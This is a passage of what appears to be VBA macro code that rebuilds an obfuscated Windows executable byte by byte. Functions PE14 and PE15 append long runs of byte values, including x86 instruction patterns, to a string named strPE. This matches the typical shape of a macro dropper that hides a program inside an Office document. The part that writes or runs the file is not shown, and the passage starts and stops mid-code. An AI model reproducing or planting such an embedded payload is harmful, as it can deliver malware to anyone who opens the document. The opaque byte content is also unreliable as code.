    strPE = A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "@"), 0), 186), ".@"), 0), "C"), 136), "@"), 0), 8), 3), 210), 0), "Q"), 136), "l"), 0), "X"), 136), "F"), 0), 252), 136), "@"), 0), "_"), 136), "@"), 0), 133), 136), "Q"), 0), 140), 136), "@"), 0), 147), 136), "@"), 0), 154), 136), "@f"), 161), 136), 255), 0)
    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 168), 2), "@j"), 175), 136), 20), 230), 252), 136), "@"), 0), 252), 136), "@"), 0), 17), 136), "@"), 0), 182), 136), "4"), 0), 189), 136), "@"), 0), 197), "5@"), 0), 203), 136), "@"), 0), 252), 136), "@"), 0), 252), 136), "@"), 0), 252), 136), "@$"), 210), 233)
    strPE = B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 162), 0), 217), 136), "@"), 0), 224), 136), "@"), 0), 231), 213), "@"), 0), "*"), 167), "@"), 211), 11), 136), "@"), 0), 144), 144), 144), 240), 144), 144), 144), 144), "U"), 139), 180), "S"), 139), "]"), 12), "V"), 139), "u"), 173), "W"), 139), "h"), 16), "j"), 155), 6), "Vh")
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(strPE, 0), "g"), 0), 0), "Wj"), 0), "h"), 0), 18), 166), 0), "-"), 21), "9"), 192), "@"), 0), 133), 192), "uD"), 212), 145), 28), 131), "bL"), 133), 201), "t[9<"), 197), 24), 195), "@"), 131), "t"), 14), 139), 5), 197), "$"), 195), "@"), 0), "@"), 133)
    strPE = B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(strPE, 201), 228), 235), "zD"), 139), "6"), 197), 28), 195), "@"), 0), 154), "P"), 16), 232), 21), 27), 0), 0), 139), "{"), 131), 201), 255), "3"), 192), 242), 174), 247), 209), "I"), 139), "Jt3"), 133), "Yt1"), 138), "L0"), 255), "H"), 224), 249), 13), "tD")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 128), 249), 10), "u"), 4), 198), 4), "` "), 133), 192), "h"), 233), 139), 198), "_"), 159), "[]"), 195), 139), "}"), 16), "Wh"), 168), 0), 143), 149), "SV"), 232), 20), 252), 22), 194), 131), 240), 16), 139), "0_^[]bP"), 144), 144), 144)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 15), "U"), 139), 236), 139), "E"), 8), "P"), 255), "="), 20), 193), 190), 0), 131), 196), 4), 133), 192), "t)"), 139), "M"), 16), 139), "U"), 12), "PQR"), 232), 222), 252), 255), 255), 131), 196), 12), "]"), 195), 20), "E"), 16), 139), "M")
    strPE = B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(strPE, 12), "hT"), 249), "@"), 0), "P"), 137), 232), 199), 252), 255), "3"), 131), "x"), 12), 128), 195), 144), 144), "U"), 139), 236), 131), 236), " "), 194), "M"), 12), "V"), 139), 155), 16), 137), " "), 3), 139), "M"), 8), "j"), 0), 139), "Jj"), 0), 253), "U"), 252), 137), "E")
    strPE = A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 194), "V"), 0), "R"), 139), 154), 164), 141), "E"), 244), "j%PR"), 199), "E"), 143), 0), 0), 0), 0), 255), 21), 152), 239), 233), 0), 207), 248), 237), "u,"), 173), 139), "="), 216), 237), "@"), 0), 255), 215), 133), 192), 226), "P"), 137), 6), "_!"), 139)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 229), "]"), 231), 146), 0), 255), 215), 199), 180), 0), 0), 0), 0), "_"), 5), 128), 252), 10), 0), "^"), 139), " ]"), 171), 12), 169), 139), "E"), 252), 137), 6), "3"), 192), "^"), 3), 136), "]"), 194), 12), 0), 144), 144), 144), 144), 144), 144), 144), 144), "y"), 139)
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 236), 131), 230), 212), 139), "M"), 12), "V"), 139), "u"), 16), "j"), 0), 141), "U_j"), 22), 139), "f_"), 139), 194), 8), 137), "E"), 4), "|E"), 252), 137), "2'"), 217), 139), 139), 4), 141), "L"), 240), "j"), 1), "QP"), 199), "E"), 234), 0), 0), 12)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 0), 199), "E"), 248), 0), 0), 0), 0), 255), "_"), 201), 193), "@"), 0), 131), "$"), 255), "u,W"), 196), "U"), 216), 193), "@\"), 186), 215), 133), 192), "u"), 10), 137), "@_^"), 139), 229), "]"), 194), 12), 0), 255), 215), 199), 6), 0), 0), 0), 0)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "_"), 5), 128), 252), 10), 0), 241), "["), 229), "]"), 194), 12), 188), "/#"), 252), 137), 6), "^"), 247), 183), 27), 192), "%"), 130), 238), 254), 255), 5), "~"), 17), 1), 0), 139), 229), "]"), 194), 12), 0), 144), 144), 144), "U"), 139), 236), "Q"), 139), 152), 8), 141)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "E"), 252), "Ph~f"), 4), 128), "QXE"), 252), 1), 0), 0), 0), 170), 21), 180), 193), "@"), 0), 34), 248), 166), 243), 203), "V"), 139), "5"), 216), 193), "@"), 0), 255), ","), 133), 192), 152), 5), "^"), 139), 229), "]"), 195), 255), 214), 5), 128), 252)
    strPE = A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(strPE, 10), 0), "^"), 139), 229), "]"), 195), "3"), 192), 139), 229), "]"), 195), 144), 144), 144), 144), 154), 144), 144), 144), 144), "U"), 24), 236), "Q"), 149), "M"), 8), 149), "E"), 149), 147), "h~f"), 224), 146), "Q"), 199), "E"), 252), 1), 0), 0), ";"), 255), 21), 180), 193)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "@"), 0), 131), 248), 156), "u8Vs5"), 216), 193), "@"), 0), 255), 214), 133), 192), "u"), 5), "X"), 135), 229), "]"), 195), 241), 214), 5), 128), 252), 10), 0), "^"), 139), "t]"), 243), 252), 192), 139), 229), "]"), 195), 144), 144), 144), 19), 144), 144), 144)
    strPE = A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "G"), 144), "U"), 139), 236), 135), 139), "]"), 12), "V"), 139), 203), 8), "#"), 143), "}"), 16), 139), 195), 11), "%u)"), 139), "N "), 217), "F$"), 162), 10), 15), 221), "("), 1), 0), 0), 139), "V"), 4), "R"), 232), 132), 255), 255), 255), "\"), 196), 4), 133)
    strPE = A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(strPE, 192), 15), "S"), 246), 0), 0), 0), "_"), 34), "[]"), 194), 216), 0), 133), 255), 15), "5"), 155), 0), 173), "k?"), 8), 133), 219), 15), "t"), 135), 18), 0), 0), 159), "F "), 139), "N$i"), 193), "u"), 20), "PN"), 221), 179), 232), 253), 254), 255)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 131), 196), 4), 133), 192), 159), 133), 199), 0), 144), 0), 139), "V ;"), 211), 34), 31), 139), "F$;^P"), 132), 173), 0), 0), 0), 139), "M"), 16), "j"), 0), "hK"), 3), 0), 0), "QS"), 141), "s"), 24), 232), 140), "("), 0), 0)
    strPE = A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 139), "V"), 4), 188), 29), 184), 193), "}"), 0), "j:W="), 6), 16), 0), 0), "h"), 255), 255), 0), 0), "R"), 137), "p"), 149), 211), 139), "F"), 4), "j"), 4), "Whr"), 16), 0), 0), "h"), 255), 255), 0), 0), "P"), 255), 211), 139), "}"), 16), 234)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(strPE, "]"), 12), 137), "~"), 232), 137), 138), " _"), 242), 205), 192), "["), 3), 194), 12), 0), 133), 255), 127), 196), "|"), 230), "t"), 219), ".L"), 139), "N"), 164), 199), 159), 8), 0), 0), 0), 0), 153), 232), "o"), 254), 255), 180), 169), 196), 148), 133), 192), "u=")
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 190), "F"), 4), 139), 193), 184), 193), 187), 0), 232), "U"), 8), 251), "VR"), 15), 6), 16), 151), 0), "h"), 163), 255), 0), 0), "P"), 255), 215), 139), 230), 4), 141), "M"), 8), "j"), 4), 169), "h"), 5), 183), "W"), 0), "h"), 252), 255), 0), 0), "R"), 255), 215)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(strPE, 139), "}t"), 137), "ST"), 137), 185), "$3"), 192), "_^[]"), 194), 12), 0), 144), 127), 144), 144), 134), 139), 236), "Q"), 139), "E"), 240), "j"), 201), 133), 192), 15), 149), 247), 137), "M"), 252), 20), "M"), 12), 131), "W@V"), 15), 143), "5"), 2)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 0), 0), 15), 132), 7), "O"), 236), "u"), 151), 131), 249), 15), 15), "U"), 0), 3), 0), ")1"), 210), 138), "+"), 16), 145), "@"), 0), 216), "$/"), 248), 144), "@"), 0), "eu"), 8), "3"), 210), 139), 21), "8"), 216), 246), 2), 128), 249), 19), 15), 148), 194)
    strPE = B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 209), 194), "t/"), 139), "N"), 4), 148), "3Ej"), 4), "P"), 173), 8), "h"), 255), 255), 0), "fQ"), 255), 21), 184), 193), "@"), 0), 131), "&"), 255), 15), 132), "C"), 2), 0), 0), 147), "E"), 16), 133), "s"), 139), "F8"), 233), 14), 12), 2), 200), "F")
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 134), "3"), 192), "^"), 153), 229), "]"), 194), 12), 0), 207), 253), 137), "F83"), 192), "^"), 139), 229), "]"), 194), 12), 0), 141), "u"), 8), "3"), 201), 139), 131), "8"), 131), 226), 4), 128), 250), 4), 146), 148), 193), ";"), 193), "p"), 212), 139), "F"), 4), 34), "U")
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(strPE, 252), "j"), 4), "Rj"), 1), 180), 175), "I"), 0), 0), "P"), 255), 21), 184), 193), "@"), 240), 131), 248), 148), 15), 245), 232), 1), 143), 0), 139), 208), 16), 183), 192), 139), 132), "8t"), 14), 12), 4), 10), "Fd3"), 192), "^"), 139), 229), "c"), 194), 12)
    strPE = B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 0), "$"), 251), 13), "F83"), 192), "^"), 139), 229), "]"), 194), 12), 252), 139), "u"), 8), "3"), 210), 225), "N8"), 131), 225), 16), 128), 249), 16), 15), 148), 194), ";"), 194), 15), 132), "u"), 4), 247), 255), 139), "N"), 4), "BE"), 252), 9), 167), "Pj")
    strPE = B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(strPE, 4), "h"), 255), "("), 0), 244), "Q"), 255), 21), "Q"), 218), "@t7"), 248), 255), 15), 132), 137), 1), 0), 0), "DE"), 184), 133), 192), 139), "F8@t"), 12), 16), 238), "F83"), 192), "^"), 139), 229), "]"), 194), 12), 0), "$"), 239), 137), "F")
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(strPE, "83"), 192), "^"), 139), 17), "N"), 194), 12), " ku)"), 194), "S"), 139), "V8"), 131), "p"), 8), 128), 250), 8), 15), 148), 193), ";"), 200), 15), 132), 22), ","), 255), 178), 133), 192), 22), 23), 139), "V"), 4), "R"), 232), "V"), 252), 255), 255), 131), 196)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 161), 133), 1), "t"), 27), "^"), 139), 229), "]^"), 0), 0), 139), 13), 4), "P"), 232), "{"), 252), 255), 255), 131), 163), 4), 31), 192), 12), 133), 165), 3), 0), 0), 139), "E"), 198), 133), 192), 139), 172), 207), "t"), 14), 12), 8), 137), "F83"), 192), "^")
    strPE = B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 139), 229), "0"), 194), 12), 0), "$"), 247), 137), "F8"), 9), 192), "^"), 139), 229), "H"), 194), 12), 0), 139), "u"), 8), 139), "N8"), 131), 225), 1), 254), 201), 221), 217), 27), 201), "A;"), 200), 15), 132), 169), 194), 255), 255), 141), "U"), 8), "jrf")

    PE14 = strPE
End Function

Private Function PE15() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 137), "E"), 8), 139), 170), 4), 175), "h"), 128), 0), 0), 0), "f"), 255), 255), 0), 0), "Pf"), 187), "E)"), 247), 23), 222), 21), 184), 237), "@"), 0), 131), 248), 255), 15), 132), 176), 0), 222), 0), 139), 10), 182), 160), 192), 139), "F8t"), 14), 12)
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 1), 231), "F83[^"), 139), 229), "=#"), 12), 198), "$"), 254), 137), 229), "8"), 195), 192), "^"), 139), 229), "]"), 155), 12), 194), 157), 248), "G"), 141), 28), 16), 243), 4), "Q"), 131), "B"), 217), "h"), 1), 250), 0), "bh%"), 255), 0), 0), "P")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(strPE, 255), "-"), 184), 193), "@"), 0), 235), 248), 203), 15), 133), "w"), 254), 255), 255), 235), "b"), 135), 249), 0), "@"), 0), 0), 15), 143), 199), 0), 0), 159), 15), 132), 213), 0), 0), 0), 196), 249), 128), 0), 0), 0), 25), 132), 141), 0), "t"), 0), 243), 249), 10)
    strPE = A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 2), 214), 0), 15), 131), 177), 0), 0), 0), 139), "C"), 8), "3"), 210), 139), "N8"), 129), 225), 216), 2), 0), 236), 157), 249), 0), "5"), 0), 0), 15), "k"), 194), ";"), 208), 15), 132), 229), 253), 255), 255), 30), "N"), 4), 141), "E"), 16), "j"), 4), "P"), 165)
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 1), "j"), 6), 172), 255), 229), 184), 193), 219), 0), "0"), 248), 255), "u"), 160), 147), "5"), 216), 193), "O"), 0), 255), 214), 133), 192), "j"), 212), "o"), 139), 169), "]"), 194), 12), 0), 255), 138), 5), 128), 252), 250), 0), "^"), 139), 229), "]"), 194), 12), 0), 139), "E")
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(strPE, 16), 133), 192), "`F8t"), 15), 128), 204), 2), 137), "#83"), 192), "^"), 139), 229), 7), 155), 12), 0), 3), 237), 253), 137), "h83"), 192), "^"), 139), 229), "]"), 194), 3), 154), 139), "E"), 8), 132), "U"), 16), "j"), 4), "R"), 139), "Hu")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(strPE, 13), 2), 16), 0), 0), "h"), 255), 255), "9"), 0), "Qa"), 21), 184), 218), "@"), 172), 131), 248), 255), 15), 133), "]"), 253), 255), 255), 235), 143), 16), 155), 0), 128), 178), 0), "t"), 12), 184), 22), 0), 0), 0), "^"), 139), 229), "]"), 194), 12), 207), 184), 135)
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 17), "V"), 0), "^"), 139), 229), "]"), 194), 12), 0), 139), 255), "p"), 143), "@"), 250), 131), 144), "@"), 0), "H"), 142), "@"), 0), 2), 143), "@"), 0), 167), 142), "{"), 0), 222), 144), "@"), 0), 0), 1), 5), 2), 5), "z"), 5), 3), 5), 171), "Z"), 5), 5), 5)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(strPE, 5), 4), "U"), 139), 236), "k"), 245), ","), 139), "E}"), 139), "M"), 12), "hWP"), 141), "U"), 212), "QR"), 232), 147), 217), 255), 255), 139), "E"), 24), ";M"), 8), "A"), 190), 10), 0), 169), 0), 219), 24), 133), 216), 196), "@i"), 141), 4), 133), 216)
    strPE = A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 196), 241), "l"), 136), 240), 255), "@A"), 138), 16), 12), "Q"), 255), 138), 226), 1), 139), "U"), 232), 136), 1), "A"), 141), 4), 149), "x"), 196), "@"), 0), 198), 1), " A"), 138), 16), 136), 17), 138), "P"), 1), 8), 181), 136), 17), 196), "q"), 1), "A"), 140), 1)
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 139), "E#"), 153), 247), 254), "A"), 198), 1), " A"), 4), "0"), 128), 194), 137), 136), 1), 139), "E"), 224), "A"), 136), 17), "A"), 153), 247), 254), 198), "= "), 184), 147), "0"), 128), 194), "0"), 136), 1), "PE"), 220), "A"), 136), 17), "A"), 26), 247), 34), 133)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(strPE, 1), 133), "A"), 4), "P"), 128), 194), "0"), 136), 1), 139), "E"), 216), "A"), 136), 17), "A"), 153), 247), 200), 198), 1), ":A"), 4), "0"), 128), 194), "0"), 136), 247), "A"), 136), 17), "A"), 139), 226), 236), 191), 232), 3), 0), 0), 198), "c I"), 166), "vl")
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(strPE, 7), 0), 153), 139), 198), 153), 195), "b"), 191), "d"), 208), 29), 0), 4), "0"), 136), 1), 184), 31), 133), 235), 3), 247), "-"), 193), 250), 5), 139), 194), "A"), 193), 232), 31), 226), 208), 139), 198), 128), 194), "0"), 205), 17), "A"), 153), 247), 255), 184), "gff")
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "f)"), 247), "x"), 193), 250), 2), 139), "F"), 193), 232), 31), 3), 240), 139), 198), 128), 194), "0"), 190), 10), 0), 21), 0), 136), "aA"), 153), 247), 254), "^Q"), 194), "03H"), 17), 17), 198), "A"), 1), 222), 139), 229), "]"), 194), 12), 0), 22), 144)
    strPE = B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(strPE, "*"), 144), "'"), 144), 144), 144), "U"), 139), 236), "S"), 139), 129), 16), "VW"), 139), 251), 131), 201), 255), "?"), 192), 200), "u"), 8), 242), 174), 247), 209), 129), 249), 248), 0), 167), 0), 137), "M"), 16), "vkhS"), 184), 193), 250), ":u%"), 138), "C")
    strPE = A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 2), "</t"), 242), "r\u"), 236), 246), 224), "6A"), 0), "V"), 219), 21), 16), 193), "@"), 0), 139), "E"), 12), 131), 196), 8), 131), 232), 4), 131), 198), 25), 235), ";"), 138), "Z</t"), 4), "<\u4"), 128), 250), "/b"), 5)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(strPE, 128), 250), "\u*"), 128), "{"), 2), "?t"), 189), 131), 233), 2), "h"), 204), 0), "A"), 0), "V"), 131), 211), 2), 148), "M"), 16), 255), 21), 16), 193), "z"), 0), 139), "E"), 12), 131), 21), 8), 131), "Q"), 8), 131), 198), 16), 137), "E"), 12), 141), "E"), 204)
    strPE = A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 141), "M"), 16), "P"), 3), "QS"), 232), 180), 22), "/"), 0), 218), 192), "t"), 17), "=x"), 17), 1), 0), "u<"), 209), "^"), 184), 22), 0), 0), 211), 30), "]"), 195), 139), "E_"), 133), 192), "t"), 10), "_^"), 184), "&{"), 0), 0), "[]"), 195)
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(strPE, "f"), 179), 6), "B"), 133), 192), "t"), 23), "f=/"), 7), "u"), 200), "f"), 156), 6), "\"), 0), "V"), 139), "F"), 2), 131), 198), 2), "f"), 133), 192), "u"), 233), "3"), 192), "_"), 175), "[]"), 195), 144), 144), 144), 144), 144), 136), "@"), 144), "U"), 139), 236), "V")
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(strPE, 139), "u5W3"), 255), 131), "~"), 4), 255), 15), 196), 239), "@"), 176), 0), 138), "F,"), 132), "Rt"), 8), "V"), 232), "o"), 163), 0), 0), 139), 248), "BFl%"), 237), 0), 199), 6), "tZ"), 132), 230), 0), 0), 6), "u"), 23), "j"), 2)
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 255), 21), 8), 193), "@"), 0), 187), 196), 4), "jRj@"), 255), 173), 164), 20), "@"), 0), 255), "F="), 0), 194), 0), 4), 232), 23), 134), 1), 255), 21), 8), 4), "@"), 0), 131), 139), 4), "j"), 255), "j"), 245), 162), 21), 164), 192), "@"), 0), 235)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "(="), 0), 0), 0), 2), "u!"), 30), 0), 255), 21), 8), 193), "@"), 0), 131), 196), 4), "j"), 255), "j"), 27), 255), 21), 164), 192), "@"), 0), 235), "^"), 236), "FPP"), 255), 242), "G"), 192), "@"), 0), 199), "F"), 4), "5"), 156), 255), 255), 139), "F")
    strPE = B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 204), 133), 192), 141), 21), 139), "("), 16), 133), 239), "t"), 182), "P"), 255), 21), "5"), 192), "@"), 0), 199), "F"), 12), 0), "8"), 0), 0), 232), 199), "_^])"), 208), 144), "\"), 144), 144), 25), "U"), 139), 236), 184), 8), "@"), 0), 0), 232), "3$C")
    strPE = A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 0), "S"), 183), "]"), 16), "VW3"), 255), 199), "E"), 248), 3), 4), "x"), 0), 246), 25), 1), 137), "}y"), 201), "4"), 199), "E"), 21), 0), 0), 0), 128), 246), 223), 2), "t"), 7), 129), "M>"), 13), 0), 0), "@"), 247), 195), 133), 0), "-"), 8), 185)
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 9), 139), "E"), 145), 128), 204), 1), 185), "E"), 252), 139), 162), 220), 8), "A"), 0), 131), 249), 30), 235), 0), 199), "E"), 248), 7), 252), "S"), 0), 139), "N-"), 224), 4), 151), 29), 246), 195), "%t"), 7), 190), 246), 0), "l"), 0), 235), 220), 138), 211), 128)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(strPE, 226), 9), 246), 16), 27), 210), 131), "|"), 254), "b"), 194), 4), 235), 15), 138), 211), 128), "n"), 197), 246), 218), 27), 210), 232), 226), 2), 131), 194), 3), 139), 242), 246), 195), "@t"), 18), 133), 192), "u"), 14), "$^"), 184), 13), 0), 0), 0), 141), 139), 229)
